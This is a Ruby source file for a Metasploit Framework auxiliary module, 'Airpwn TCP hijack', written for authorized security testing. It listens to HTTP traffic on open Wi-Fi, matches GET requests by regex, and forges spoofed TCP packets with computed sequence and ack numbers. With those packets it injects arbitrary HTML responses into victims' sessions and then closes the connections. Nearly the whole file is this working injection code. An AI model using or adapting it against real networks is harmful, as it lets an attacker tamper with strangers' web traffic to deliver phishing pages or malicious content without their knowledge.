##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'yaml'
require 'racket'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Lorcon2
	include Msf::Auxiliary::Report
	
	def initialize
		super(
			'Name'        => 'Airpwn TCP hijack',
			'Version'     => '$Revision$',
			'Description'    => %q{
				TCP streams are 'protected' only in so much as the sequence
			number is not guessable.

			Wifi is shared media.

			Got your nose.

			Responses which do not begin with Header: Value assumed to be
			HTML only and will have Header:Value data prepended.  Responses
			which do not include a Content-Length header will have one generated.
			},
			'Author'      => ['toast', 'dragorn', 'ddz', 'hdm'],
			'License'     => MSF_LICENSE,
			'Actions'     =>
				[
				 	[ 'Airpwn' ]
				],
			'PassiveActions' => 
				[
					'Capture'
				],
			'DefaultAction'  => 'Airpwn'
		)

		register_options(
			[
				OptPath.new('SITELIST',	  [ false, "YAML file of URL/Replacement pairs for GET replacement",
						File.join(Msf::Config.install_root, "data", "exploits", "wifi", "airpwn", "sitelist.yml") 
					]),
				OptBool.new('USESITEFILE', [ true, "Use site list file for match/response", "false"]),
				OptString.new('FILTER',	  [ true, "Default BPF filter", "port 80"]),
				OptString.new('MATCH',	  [ true, "Default request match", "GET ([^ ?]+) HTTP" ]),
				OptString.new('RESPONSE',  [ true, "Default response", "Airpwn" ]),
			], self.class)
	end

	def run

		@sitelist = datastore['SITELIST']
		@regex    = datastore['MATCH']
		@response = datastore['RESPONSE']
		@filter	  = datastore['FILTER']
		@useyaml  = datastore['USESITEFILE']

		@http = []

		if @useyaml then
			begin
			@http = YAML::load_file(@sitelist)

			rescue ::Exception => e
				print_error "AIRPWN: failed to parse YAML file, #{e.class} #{e} #{e.backtrace}"
			end
		else
			@http[0] = { "regex" => @regex, "response" => @response }
		end

		@run = true

		print_status "AIRPWN: Parsing responses and defining headers"

		# Prep the responses
		@http.each do |r|
			if not r["response"] then
				if not r["file"] then
					print_error "AIRPWN: Missing 'response' or 'file' in yaml config"
					r["txresponse"] = ""
				else
					r["txresponse"] = ""
					begin
					File.open r["file"], File::RDONLY do |io|
						r["txresponse"] += io.read(4096)
					end
					rescue EOFError
					rescue ::Exception => e
						print_error("AIRPWN: failed to parse response file " \
								    "#{r['file']}, #{e.class} #{e} #{e.backtrace}")
					end
				end
			else
				if r["file"] then
					print_error "AIRPWN: Both 'response' and 'file' in yaml config, " \
								"defaulting to 'response'"
				end

				r["txresponse"] = r["response"]
			end

			# If we have headers
			if r["txresponse"].scan(/[^:?]+: .+\n/m).size > 0
			#  But not a content-length
				if r["txresponse"].scan(/^Content-Length: /).size == 0 
					# Figure out the length and add it
					loc = (/\n\n/m =~ r["txresponse"])
					if loc == nil 
						print_status "AIRPWN: Response packet looks like HTTP headers but can't find end of headers.  Will inject as-is."
					else
						print_status "AIRPWN: Response packet looks like HTTP headers but has no Content-Length, adding one."
						r["txresponse"].insert(loc, "\r\nContent-Length: " + (r["response"].length - loc).to_s)
					end
				end
			else
			# We have no headers, generate a response
				print_status "AIRPWN: Response packet has no HTTP headers, creating some."
				r["txresponse"].insert(0, "HTTP/1.1 200 OK\r\nDate: %s\r\nServer: Apache\r\nConnection: close\r\nContent-Type: text/html\r\nContent-Length: %d\r\n\r\n" % [Time.now, @response.size])
			end
		end

		open_wifi

		self.wifi.filter = @filter if (@filter != "") 
		self.wifi.each_packet do |pkt|
			d3 = pkt.dot3

			next if not d3

			eth = Racket::Ethernet.new(d3)
			next if eth.ethertype != 0x0800

			ip = Racket::IPv4.new(eth.payload)
			next if ip.protocol != 6

			tcp = Racket::TCP.new(ip.payload)

			@http.each do |r|
				hit = nil
				r['regex'].each do |reg| 
					hit = tcp.payload.scan(/#{reg}/) || nil
					break if hit.size != 0
				end
				next if hit.size.zero?

				print_status("AIRPWN: %s -> %s HTTP GET [%s] TCP SEQ %u" % [ip.src_ip, ip.dst_ip, $1, tcp.seq])

				injpkt = Lorcon::Packet.new()
				injpkt.bssid = pkt.bssid

				response = Racket::Racket.new
				response.l2 = Racket::Ethernet.new("01234567890123")
				response.l2.dst_mac = eth.src_mac
				response.l2.src_mac = eth.dst_mac
				response.l2.ethertype = 0x0800

				response.l3 = Racket::IPv4.new
				response.l3.src_ip = ip.dst_ip
				response.l3.dst_ip = ip.src_ip
				response.l3.protocol = ip.protocol
				response.l3.ttl = ip.ttl

				response.l4 = Racket::TCP.new
				response.l4.src_port = tcp.dst_port
				response.l4.dst_port = tcp.src_port
				response.l4.window = tcp.window

				response.l4.seq = tcp.ack
				response.l4.ack = tcp.seq + ip.payload.size - (tcp.offset * 4)

				response.l4.flag_ack = 1
				response.l4.flag_psh = 1

				response.l5 = Racket::RawL5.new
				response.l5.payload = r["txresponse"]

				response.l4.fix!(response.l3.src_ip, response.l3.dst_ip, '')

				injpkt.dot3 = response.pack

				case pkt.direction
				when ::Lorcon::Packet::LORCON_FROM_DS
					injpkt.direction = Lorcon::Packet::LORCON_TO_DS
				when ::Lorcon::Packet::LORCON_TO_DS
					injpkt.direction = Lorcon::Packet::LORCON_FROM_DS
				else
					injpkt.direction = Lorcon::Packet::LORCON_ADHOC_DS
				end

				self.wifi.inject(injpkt) or print_status("AIRPWN failed to inject packet: " + tx.error) 

				response.l4.seq = response.l4.seq + response.l5.payload.size
				response.l4.flag_ack = 1
				response.l4.flag_psh = 0
				response.l4.flag_fin = 1
				response.l4.payload = ""
				response.l4.fix!(response.l3.src_ip, response.l3.dst_ip, "")

				injpkt.dot3 = response.pack
				self.wifi.inject(injpkt) or print_status("AIRPWN failed to inject packet: " + tx.error) 
			end
		end

	end

end
